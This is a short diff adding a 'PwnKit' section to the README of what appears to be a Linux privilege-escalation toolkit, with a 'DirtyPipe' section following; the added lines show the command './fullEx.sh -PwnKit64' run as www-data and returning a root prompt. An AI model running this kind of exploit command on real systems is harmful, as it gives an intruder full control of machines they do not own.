@@ -44,6 +44,13 @@ Commands:
    -help          Affiche les commandes
  ```
 
+# 💀 PwnKit
+
+```
+www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -PwnKit64
+./fullEx.sh -PwnKit64
+root@Milburg-High:/tmp/fullEx#
+```
 
 # 💀 DirtyPipe
 
